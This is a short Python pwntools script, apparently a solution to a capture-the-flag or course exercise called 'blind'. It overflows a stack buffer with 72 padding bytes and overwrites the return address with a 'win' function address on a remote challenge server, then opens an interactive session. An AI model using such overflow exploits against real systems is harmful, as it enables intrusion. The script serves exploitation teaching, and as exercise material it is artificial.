#!/usr/bin/env python3

from pwn import *

# p = process("./blind")
p = remote("6447.lol", 18496)

win_address = 0x401196  # replaced win address from the address of the win method from binary ninja
offset = 72

payload = b"A" * offset
payload += p64(win_address)

p.sendline(payload)
p.interactive()
